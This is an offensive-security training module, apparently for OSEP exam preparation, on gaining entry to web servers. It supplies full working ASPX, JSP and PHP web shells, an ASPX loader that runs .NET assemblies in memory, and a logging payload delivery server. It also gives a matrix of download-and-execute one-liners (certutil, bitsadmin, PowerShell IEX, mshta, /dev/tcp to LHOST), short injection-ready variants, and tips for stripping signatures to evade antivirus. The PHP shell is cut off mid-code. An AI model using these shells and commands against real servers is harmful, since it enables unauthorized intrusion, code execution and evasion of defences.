::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 10 · Web entry: ASPX web shells and post-injection download/execute

> **Covers scenarios:** 14, 15, 16
>
> **Course basis:** chapters 8–9 (managed loading), chapter 24 (web and service accounts), C2/C6 (web entry)
>
> **Prerequisites:** a web service that allows uploads or has an injection point; IIS/.NET (ASPX) or PHP/JSP runtime; a delivery address on the attacker box that the target can reach

**Shared principles for this module**:
1. **Web-entry identity is usually low-privileged** (IIS app-pool account, `NT AUTHORITY\NETWORK SERVICE`); the first thing to do after landing is `whoami /priv` — whether `SeImpersonatePrivilege` is present decides whether you can escalate immediately.
2. **Public web shells always get killed** — trim yours down to the necessary function only, and keep stage 2 as an independently replaceable file.
3. **Command length and quotes are silent killers** — injection points often truncate complex commands; a short stage 1 plus separate execution is almost always more reliable.

---

## Scenario 14: The site allows ASPX upload, the back end is IIS, and the target has AV installed

**Situation**: An uploaded ASPX is parsed by the server, so simple command execution works; but public web shells or uploaded EXEs get killed; the current identity is an app-pool account.

**Assumptions**:
- The upload directory is web-accessible and allows `.aspx` (or you can rename to `.ashx`/`.asmx`/`.config`).
- The target has AV installed (signatures for files on disk and for common web-shell fingerprints).
- Current identity is confirmed as an app-pool account (limited rights, but often carries `SeImpersonatePrivilege`).

**Prepare (attacker side)**:
1. Prepare three artifacts:
   | File | Purpose |
   |---|---|
   | `m10-minimal-exec.aspx` | Minimal execution entry (no UI, no extras) |
   | `m10-managed-loader.aspx` | Load managed assemblies / execute in memory |
   | `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for other runtimes |
2. Make stage 2 a standalone file that is **independently replaceable** (so you do not re-upload the web shell every time you change it).
3. Delivery service:
   ```bash
   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
   ```

**Procedure**:
1. Upload the minimal ASPX, request it once, and confirm it executes:
   ```text
   GET /upload/shell.aspx?cmd=whoami
   ```
2. Immediately confirm identity and privileges:
   ```text
   cmd=whoami /priv
   cmd=whoami /groups
   ```
3. If AV kills it → strip the fingerprint: remove comments, drop `eval`, split or encode command keywords; or change the extension and path.
4. If the uploaded EXE gets killed → switch to **in-memory loading**: the ASPX only `Assembly.Load`s the stage-2 bytes (Base64) into the IIS process — nothing lands on disk.
5. Once execution is stable: if `SeImpersonatePrivilege` is present → go to [06-uac-windows-privesc](/modules/06-uac-windows-privesc) scenario 26.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m10-minimal-exec.aspx` | Minimal command execution | `cmd` parameter |
| `m10-managed-loader.aspx` | In-memory load of managed assemblies | `b64` parameter |
| `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for non-IIS environments | `cmd` |
| `m10-download-fallbacks.md` | Downloader fallback matrix | — |

#### `m10-minimal-exec.aspx`

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%--
Purpose: minimal ASPX command-execution entry — it does one thing: pass the URL parameter cmd to cmd.exe /c and echo plain-text output.
      No UI, no upload/download/file-management features, no fingerprint strings from public web shells — to keep the chance of hitting an AV signature as low as possible.
Scenario: 14 (the upload directory parses ASPX but public web shells get killed), 16 (when the injection point is length-limited, use it as a long-command channel)
Dependencies: IIS 6+ / .NET 2.0+; app-pool account rights are enough (it runs inside the w3wp.exe process)
Usage:
  1) After upload, name it shell.aspx (or an allowed .ashx/.asmx)
  2) Request: http://TARGET/upload/shell.aspx?cmd=whoami%20/priv
  3) With no cmd parameter it returns an empty 200 (use this to tell whether the page is parsed)
Placeholders: TARGET=target site address; cmd=command to run (URL-encode it; write spaces as %20)
Test status: not tested on IIS; tag pairing and structural checks were run with python3 (see the note at the end); validate in the lab environment before the exam
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string c = Request["cmd"];
    if (c == null || c.Length == 0) return;

    Response.ContentType = "text/plain";

    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + c;
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    psi.WorkingDirectory = "C:\\Windows\\Temp";

    try
    {
        using (Process p = Process.Start(psi))
        {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(30000);
        }
    }
    catch (Exception ex)
    {
        Response.Write(ex.Message);
    }
}
</script>
<%--
Self-check notes (static checks when you have no IIS):
  1) Tag pairing: <@ ... %> and <script runat="server"> ... </script> appear in pairs, and the <%-- --%> comment is closed.
  2) C# brace balance: use python3 to count whether the numbers of { and } inside the Page_Load body are equal.
  3) Quotes/semicolons: every ProcessStartInfo field assignment and the using block end with a semicolon.
  All of the above was run with a python3 script (no .NET compiler is installed here, so only structural checks are possible; a real compile needs csc on Windows or the first request to IIS).
--%>
````

#### `m10-managed-loader.aspx`

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%--
Purpose: managed-assembly loader — read a .NET assembly from a byte array (Base64 or POST body) or from a disk path,
      Assembly.Load() it inside the w3wp.exe process, then call the entry point (EntryPoint, or a specified type/method) plus arguments.
      The EXE never lands on disk — for cases where "an EXE on disk is forbidden but you need a managed tool".
Scenario: 14 (the uploaded EXE gets killed by AV → switch to in-memory loading), 20 (you need a managed tool but must not write to disk)
Dependencies: IIS + .NET 4.x (assembly bitness and target framework must match the app pool; an x64 pool loads AnyCPU/x64 assemblies)
Usage:
  # 1) Byte array (most common; pairs with "send Base64" in docs/10 scenario 14)
  curl -k "http://TARGET/upload/loader.aspx?b64=<BASE64ASSEMBLY>&args=-a%20-b"
  # 2) From disk (the assembly was already written to the target by other means)
  curl -k "http://TARGET/upload/loader.aspx?file=C:\Windows\Temp\p.exe&type=Payload.Runner&method=Run"
  # 3) POST the raw bytes directly (the request body is the assembly)
  curl -k --data-binary @payload.exe "http://TARGET/upload/loader.aspx?args=whoami"
  # With no type/method it takes asm.EntryPoint automatically; with type but no method it lists that type's public static method names.
Placeholders: TARGET=target site; LHOST/URL=assembly source (this page does not download anything itself; pair it with m10-download-fallbacks.md when you need a download);
        b64=Base64 assembly; file=path to the assembly on the target disk; type/method=entry point; args=arguments (split on spaces by default; use argssep to set a different separator)
Test status: not tested on IIS; tag pairing and brace-balance checks were run with python3; validate in the lab environment
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/plain";

    string file = Request["file"];
    string b64 = Request["b64"];
    string typeName = Request["type"];
    string methodName = Request["method"];
    string argstr = Request["args"];
    string sep = Request["argssep"];

    byte[] raw = null;
    try
    {
        if (!string.IsNullOrEmpty(file))
            raw = File.ReadAllBytes(file);
        else if (!string.IsNullOrEmpty(b64))
            raw = Convert.FromBase64String(b64);
        else if (Request.ContentLength > 0)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                Request.InputStream.CopyTo(ms);
                raw = ms.ToArray();
            }
        }
    }
    catch (Exception ex)
    {
        Response.Write("read error: " + ex.Message);
        return;
    }

    if (raw == null || raw.Length == 0) return;

    string[] argv;
    if (string.IsNullOrEmpty(argstr))
        argv = new string[0];
    else if (!string.IsNullOrEmpty(sep))
        argv = argstr.Split(new string[] { sep }, StringSplitOptions.RemoveEmptyEntries);
    else
        argv = argstr.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

    try
    {
        Assembly asm = Assembly.Load(raw);

        MethodInfo mi = null;
        if (string.IsNullOrEmpty(typeName))
        {
            mi = asm.EntryPoint;
        }
        else
        {
            Type t = asm.GetType(typeName);
            if (t == null)
            {
                Response.Write("type not found: " + typeName);
                return;
            }
            if (string.IsNullOrEmpty(methodName))
            {
                foreach (MethodInfo m in t.GetMethods(BindingFlags.Public | BindingFlags.Static))
                    Response.Write(m.Name + "/" + m.GetParameters().Length + " ");
                return;
            }
            mi = t.GetMethod(methodName,
                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance);
        }

        if (mi == null)
        {
            Response.Write("entry point not found");
            return;
        }

        ParameterInfo[] ps = mi.GetParameters();
        object[] parameters;
        if (ps.Length == 0)
            parameters = null;
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
            parameters = new object[] { argv };
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string))
            parameters = new object[] { argstr == null ? "" : argstr };
        else
        {
            StringBuilder sb = new StringBuilder();
            foreach (ParameterInfo pi in ps) sb.Append(pi.ParameterType.Name).Append(" ");
            Response.Write("signature mismatch, need: " + sb.ToString());
            return;
        }

        // Most managed tools write their results to the Console; take over Console.Out here so the output comes back with the response
        TextWriter old = Console.Out;
        StringWriter captured = new StringWriter();
        object result = null;
        string error = null;
        try
        {
            Console.SetOut(captured);
            object instance = mi.IsStatic ? null : Activator.CreateInstance(mi.DeclaringType);
            result = mi.Invoke(instance, parameters);
        }
        catch (TargetInvocationException tie)
        {
            error = tie.InnerException == null ? tie.Message : tie.InnerException.Message;
        }
        finally
        {
            Console.SetOut(old);
        }

        Response.Write(captured.ToString());
        if (error != null)
            Response.Write("invoke error: " + error);
        else if (result != null)
            Response.Write(result.ToString());
    }
    catch (Exception ex)
    {
        Response.Write("load error: " + ex.Message);
    }
}
</script>
<%--
Self-check notes (static checks when you have no IIS):
  1) Tag pairing: <%@ %>, <script runat="server">...</script> and <%-- --%> are all closed.
  2) C# brace balance: use python3 to confirm the numbers of { and } inside the Page_Load body are equal and that parentheses are paired.
  3) Every class used is covered by an Import or a fully-qualified name (System.Reflection / System.IO / System.Text are already imported).
  Real compile check: on Windows, paste the code inside <script> into a .cs file and compile it with csc /t:library to confirm the syntax.
--%>
````

#### `m10-jsp-shell.jsp`

````xml
<%--
Purpose: minimal JSP command-execution entry — a fallback channel under Tomcat/Jetty/JBoss and similar containers; it picks
      /bin/sh -c (Linux) or cmd.exe /c (Windows) automatically from os.name, and echoes stdout merged with stderr.
Scenario: fallback for 14 (a web entry exists, but the runtime is JSP rather than ASPX), 16 (a long-command channel beyond a length-limited injection point)
Dependencies: a servlet container (Tomcat 7+ / JDK 6+); container-process account rights are enough
Usage:
  1) Upload into an accessible webapps directory (for example /var/lib/tomcat9/webapps/ROOT/shell.jsp)
  2) Request: http://TARGET/shell.jsp?cmd=id
  3) With no cmd parameter it returns "ready" (proof that the container has compiled and run the page)
Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
Test status: not tested on Tomcat; tag pairing and structural checks were run with python3; validate in the lab environment
--%>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
    String c = request.getParameter("cmd");
    if (c == null || c.trim().length() == 0) {
        out.print("ready");
        return;
    }

    String os = System.getProperty("os.name").toLowerCase();
    String[] real;
    if (os.indexOf("win") >= 0)
        real = new String[] { "cmd.exe", "/c", c };
    else
        real = new String[] { "/bin/sh", "-c", c };

    try {
        ProcessBuilder pb = new ProcessBuilder(real);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        br.close();
        p.waitFor();
    } catch (Exception e) {
        out.println("error: " + e.getMessage());
    }
%>
<%--
Self-check notes (static checks when you have no Tomcat):
  1) Tag pairing: the <%@ page %> directive and the <% ... %> scriptlet are closed, and the <%-- --%> comment is closed.
  2) Java brace/paren balance: use python3 to confirm the numbers of { } and ( ) are equal.
  3) Real compile check: Tomcat compiles on the first request; or pull the scriptlet into a .java file and check the syntax with javac.
--%>
````

#### `m00-delivery-server.py`

````python
#!/usr/bin/env python3
"""Purpose: delivery server — HTTP/HTTPS on both channels; it logs the source, User-Agent and path of every request, to confirm "did the target really download it"

Scenario: shared infrastructure (pairs with docs/00-environment-and-infra.md; supports delivery and troubleshooting for scenarios 3, 8, 15, 16, 17, 28, 30, 31)

Dependencies: Python 3.7+ (standard library); HTTPS needs a cert/key (generate them with openssl or m00-build-payloads.sh)

Usage:
    # HTTP (default 80)
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS (self-signed)
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # Probe-only mode: return no file, only log the request (confirms the target's egress path)
    python3 m00-delivery-server.py --port 8000 --probe-only

Placeholders: LHOST=attacker IP (the script prints the usable URLs); PAYLOAD=payload filename placed under --dir

Test status: syntax-checked on this macOS host with Python 3 (py_compile); HTTP mode can be run and verified directly
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """Static file service with structured logging; probe-only mode only logs and returns no files."""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # suppress the default stderr output; everything goes through _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # Fallback: probe the default route's egress address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP delivery server (HTTP/HTTPS + request log)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="log path, default <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="only record requests, do not return files")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] Delivery root: {root}")
    print(f"[*] Request log:   {log_path}")
    print(f"[*] Mode:       {'probe-only (log only)' if args.probe_only else 'file delivery'}")
    print("[*] Available addresses:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C to stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m10-download-fallbacks.md`

````markdown
# Downloader fallback matrix (scenarios 15 / 16 / 17)

> Purpose: when one download tool is blocked after you get command execution, work down the "blocked → which one next" order. **Change only one variable at a time** and record the result.
>
> Scenarios: 15 (the injection point runs commands but the downloader is blocked), 16 (command length is limited, so use the shortest form), 17 (the control case when there is no stable egress)
>
> Dependencies: the delivery service on the attacker side, `python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads`
>
> Placeholders: `LHOST` (attacker IP), `LPORT` (attacker port), `PAYLOAD` (delivery filename), `URL` (full http(s) address), `TARGET` (target)
>
> Test status: every command template had its argument order checked by hand; not tested in a target environment — before the exam, work through section 5 once as a harmless download check

---

## 1. Main order (Windows targets): when one is blocked, move down the list

| Order | Tool | Command template | Length | Test for "switch to the next one" |
|---|---|---|---|---|
| 1 | `curl` | `curl -s -o C:\Windows\Temp\PAYLOAD URL` | medium | Built into Win10 1803+ and available most often; if it says "not recognized as an internal or external command" → the OS is too old, go to 2 |
| 2 | `certutil` | `certutil -urlcache -split -f URL C:\Windows\Temp\PAYLOAD` | medium | Often blocked by AppLocker/AV (it says "access denied" or returns a non-zero code) → go to 3; afterwards remember `certutil -urlcache -split -f URL delete` to clear the cache entry |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal URL C:\Windows\Temp\PAYLOAD` | long | Goes through the BITS service and leaves obvious logs; if it says it cannot connect to BITS → go to 4 |
| 4 | PowerShell `DownloadString` (in memory, nothing on disk) | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | long | Watch AMSI (see `m05-amsi-bypass-variants.ps1`); if AMSI/CLM blocks it → go to 5 |
| 5 | PowerShell `WebClient.DownloadFile` | `powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('URL','C:\Windows\Temp\PAYLOAD')"` | long | Same client family as 4; if both fail, the PowerShell layer is blocked → go to 6 |
| 6 | `wget` (if the target has it installed) | `wget -q URL -O C:\Windows\Temp\PAYLOAD` | short | Rare; if it is not installed → go to 7 |
| 7 | Python one-liner (target has Python) | `python -c "import urllib.request;urllib.request.urlretrieve('URL','C:\\Windows\\Temp\\PAYLOAD')"` | medium | No Python → go to 8 |
| 8 | `rundll32` + `url.dll` (only issues the request / fetches the file; often used to check connectivity) | `rundll32.exe url.dll,OpenURL URL` | medium | It pops up the associated program, so it is normally only used to prove egress; to actually write a file use 9 |
| 9 | `regsvr32` / `mshta` remote execution (no EXE on disk; pull the script directly) | `mshta http://LHOST/PAYLOAD.hta` | short | AV/AMSI watch this closely; for usage see `docs/02-hta.md` |
| 10 | `ncat`/`nc` (last resort; needs cooperation from your side) | target: `ncat LHOST LPORT > C:\Windows\Temp\PAYLOAD`; attacker: `ncat -lvnp LPORT < PAYLOAD` | short | Requires ncat on the target, and you must be able to run it interactively or in the background |

**Mnemonic for the order**: curl → certutil → bitsadmin → PowerShell → wget → python → rundll32 → nc.

---

## 2. Linux targets (same idea)

| Order | Command template |
|---|---|
| 1 | `curl -s URL -o /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 2 | `wget -q URL -O /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 3 | `python3 -c "import urllib.request;urllib.request.urlretrieve('URL','/tmp/.PAYLOAD')"` |
| 4 | `python -c "import urllib;urllib.urlretrieve('URL','/tmp/.PAYLOAD')"` (legacy Python 2 target) |
| 5 | `bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.PAYLOAD'` (bash built-in, hardest to block; the attacker side needs `ncat -lvnp LPORT < PAYLOAD`) |
| 6 | `printf 'GET /PAYLOAD HTTP/1.0\r\n\r\n' > /dev/tcp/LHOST/LPORT` (proves egress only) |

---

## 3. Shortest forms when command length is limited (scenario 16)

```text
# download only first (~30 characters, the shortest)
curl -so a http://LHOST/a
# then execute (2 characters)
a

# one-line version (~35 characters)
curl -so a http://LHOST/a&a

# shortest certutil (~40 characters)
certutil -urlcache -f http://LHOST/a a

# shortest PowerShell (~60 characters, including the -c quotes)
powershell -c "iwr http://LHOST/a -o a"
```

**Measure the length ceiling first**, then pick a tool: grow a harmless command (`echo AAAA...`) step by step until you find the truncation boundary; if the injection point filters spaces or quotes, switch to the `+` or Base64 argument version (see scenario 16 in `docs/10-web-entry-webshell.md`).

---

## 4. Post-download verification (mandatory, or you will waste time chasing "false success")

```cmd
certutil -hashfile C:\Windows\Temp\PAYLOAD MD5
```
```bash
md5sum /tmp/.PAYLOAD          # Linux target
```
Compare with `md5sum ~/osep/payloads/PAYLOAD` on the attacker box: a hash mismatch = tampered with by a proxy/cache, or an incomplete download.

---

## 5. Troubleshooting discipline (locate by symptom, do not try things at random)

| Symptom | Conclusion | Next step |
|---|---|---|
| The delivery log shows **no** request | The tool is blocked, or the command never ran at all | Switch tools (the order in section 1 of this file); first run `curl -s -o nul URL` to validate the execution chain |
| There is a request but no file on the target | No permission on the write path / AV deleted it immediately | Change directory (`%TEMP%`, `C:\ProgramData\`), change the filename |
| The file exists but the hash does not match | Proxy/cache tampering | Switch to HTTPS (scenario 31 in `docs/09`) or verify in chunks |
| The file is correct but execution fails | Static/behavioural detection | Go to scenarios 18/19 in `docs/05-applocker-clm-amsi.md` |
| Every downloader is blocked | The transport channel is dead | Switch to an upload channel (`m10-managed-loader.aspx` carrying Base64), a proxy (scenario 28), DNS (scenario 32), domain fronting (scenario 33) |

---

## 6. Related scripts

| Script | Purpose |
|---|---|
| `m00-delivery-server.py` | Delivery + request log (decides "did a request actually go out") |
| `m10-minimal-exec.aspx` | Long-command execution channel when you have a web shell |
| `m10-managed-loader.aspx` | When every download is blocked, push stage 2 straight into memory with Base64 |
| `m05-amsi-bypass-variants.ps1` | What to do when AMSI blocks the PowerShell downloader |
| `m09-https-listener.sh` | Start a TLS listener when delivery needs HTTPS |
````

**Validation**: HTTP 200 with command output; `whoami` shows an app-pool account; `w3wp.exe` appears in `tasklist` (the ASPX runs inside the w3wp process).

**Failure branches and alternatives**:
1. **ASPX killed** → strip and encode it; or switch to `.ashx`/`.asmx`; or upload a `.config` to trigger parsing (depends on the environment).
2. **EXE killed** → load it in memory (`Assembly.Load`), or use PowerShell reflection (if w3wp allows it).
3. **Uploads restricted** (extension allowlist) → find another upload point, a parsing flaw, or an injection point (scenarios 15/16).
4. **The app-pool account is too low-privileged and has no SeImpersonate** → hunt for other service accounts on the same server (IIS configuration, credentials in connection strings).

**Exam / OPSEC notes**: treat the web shell as an execution entry only and hand all the heavy work to an independent stage 2; then every time something gets killed you only swap one file instead of hunting for another upload point.

---

## Scenario 15: A classic ASP site has SQL injection and can run OS commands, but the downloader is blocked

**Situation**: You already have command execution through the database, but one system download tool fails while another can download the same file. → What you need is a **transport fallback route**, not a new injection tool.

**Assumptions**:
- You can already run OS commands through the injection point (`xp_cmdshell` or equivalent).
- The target has egress, but some download tools are blocked by application control / AV / a proxy.
- You already have a validated EXE/script as stage 2.

**Prepare (attacker side)**: prepare the downloader fallback matrix (`m10-download-fallbacks.md`)

| Priority | Tool | Command template | Notes |
|---|---|---|---|
| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+, available most often |
| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | The classic; often blocked by policy |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Goes through the BITS service |
| 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | Watch AMSI |
| 5 | `wget`/`nc` | `nc LHOST 80 > p.exe` (needs interaction) | Last resort |

**Procedure**:
1. Confirm egress first: from the injection point run `curl -s -o nul http://LHOST/ping` (a hit in your delivery log means success).
2. Try the downloaders in matrix order, switching one at a time, **changing only one variable**.
3. After the download, verify: `certutil -hashfile C:\Windows\Temp\p.exe MD5` must match the attacker box.
4. Then execute; if execution is blocked → go to the AV-evasion / behavioural handling in scenarios 18/19 of `docs/05`.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m10-download-fallbacks.md` | Downloader fallback matrix and commands | LHOST/URL |
| `m10-minimal-exec.aspx` | Alternate execution channel when you have a web shell | `cmd` |

**Validation**: a request from the target IP appears in the delivery service log; the file exists on the target with a matching hash; there is a callback or output after execution.

**Failure branches and alternatives**:
1. **Every downloader is blocked** → switch to an "upload" channel (web shell / upload point) or embed Base64 and write it in chunks.
2. **Only specific domains may egress** → domain fronting / proxy ([09-c2-egress-channels](/modules/09-c2-egress-channels)).
3. **The command is escaped/truncated** → switch to a shorter command (scenario 16).

**Exam / OPSEC notes**: a failed downloader **does not mean the network is down** — read the delivery log first and separate "no request was made" (the tool is blocked) from "it requested but nothing came back" (a network/proxy problem).

---

## Scenario 16: Web command injection only accepts very short commands

**Situation**: An internal page offers ping and similar features and is command-injectable, but the argument length is limited — complex quotes and nested commands are easily truncated.

**Assumptions**:
- The injection point exists, but length and character set are limited (often <100 characters).
- The target has egress (otherwise fall back to embedding).

**Prepare (attacker side)**:
1. Prepare an **extremely short stage 1** (replace long commands with "download a script, then run it"):
   ```text
   # download only first (~40 characters)
   certutil -urlcache -f http://LHOST/a a
   # then execute
   a
   ```
2. Prepare encoded-argument variants suited to the target interpreter (pass Base64; avoid quotes).
3. Put the stage-2 script in place in advance, with the shortest possible filename (`a`, `b`).

**Procedure**:
1. Measure the length ceiling first: grow a harmless command (`echo AAAA...`) step by step to find the boundary.
2. Use the two-step "download + execute" pattern: the first step only writes the file, the second only executes it.
3. Confirm every step through the delivery log (did the target really issue the request).
4. If quotes get truncated → switch to Base64/hex arguments, or write the content into a file and then execute that.
5. If that is still not enough → concatenate several chunks with redirection (`>a`, `>>a`), writing them over multiple requests.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m10-download-fallbacks.md` | Short-command download templates | LHOST |
| `m10-minimal-exec.aspx` | Long-command channel when you have a web shell | `cmd` |

**Validation**: requests appear in the delivery log in order; the file exists on the target; there is a callback or output after execution.

**Failure branches and alternatives**:
1. **The two-step is still truncated** → use a shorter downloader (`bitsadmin /transfer` is long too; prefer `curl -o a http://LHOST/a`).
2. **The target has no egress** → embed Base64 (but length is limited, so you need multi-chunk concatenation).
3. **The injection point filters keywords** (`curl`/`certutil` are filtered) → switch to an equivalent tool or encoded arguments.

**Exam / OPSEC notes**: spend two minutes measuring the length ceiling — far faster than guessing over and over; the shorter the filename, the better.

---

## Module cheat sheet

| Goal | Command / key point |
|---|---|
| Minimal ASPX execution | `m10-minimal-exec.aspx` (add `?cmd=whoami` when you request it) |
| Load stage 2 in memory | `m10-managed-loader.aspx?b64=...` |
| Identity and privileges | `whoami /priv` (watch for SeImpersonatePrivilege) |
| Downloader fallback order | curl → certutil → bitsadmin → PowerShell → nc |
| Hash verification | `certutil -hashfile p.exe MD5` |
| Command length limited | short stage 1 + separate download and execute |
| Killed by AV | strip the fingerprint / encode / change extension / load in memory |

## Related scripts

| Script | Notes |
|---|---|
| `m10-minimal-exec.aspx` | Minimal execution entry |
| `m10-managed-loader.aspx` | Managed assembly loading |
| `m10-jsp-shell.jsp` | JSP fallback |
| `m10-php-shell.php` | PHP fallback |
| `m10-download-fallbacks.md` | Downloader fallback matrix |
| `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell downloads |
| `m00-delivery-server.py` | Delivery and request logging |

#### `m10-php-shell.php`

````php
<?php
/*
Purpose: minimal PHP command-execution entry — covers LAMP / nginx+php-fpm / IIS+PHP; it picks
      /bin/sh -c (Linux) or cmd /c (Windows) automatically from PHP_OS, and degrades through the command-execution functions as they are available.
Scenario: fallback for 14 (a web entry exists but the runtime is PHP), 15/16 (you have injection/upload but need a stable long-command channel)
Dependencies: PHP 5.4+; at least one of proc_open / shell_exec / exec / system / passthru / popen is not in disable_functions
Usage:
  1) Upload into a web-accessible directory (for example /var/www/html/shell.php)
  2) Request: http://TARGET/shell.php?cmd=id
  3) With no cmd parameter it returns "ready" (proof that PHP has parsed it and no WAF blocked it)
Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
Test status: not tested on a target; passed a syntax check with php -l (use python3 tag-pairing checks when you have no PHP environment)
*/

if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
    header('Content-Type: text/plain; charset=UTF-8');
    echo "ready";
    exit;
}

$cmd = $_REQUEST['cmd'];
header('Content-Type: text/plain; charset=UTF-8');

$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

if (function_exists('proc_open')) {
    if ($is_win) {
        $argv = $cmd;
    } else {
        $argv = '/bin/sh -c ' . escapeshellarg($cmd);
    }
    $desc = array(
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $proc = proc_open($argv, $desc, $pipes);
    if (is_resource($proc)) {
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($proc);
        exit;
    }
}

if (function_exists('shell_exec')) {
    echo shell_exec($cmd);
    exit;
}

if (function_exists('exec')) {
    $out = array();
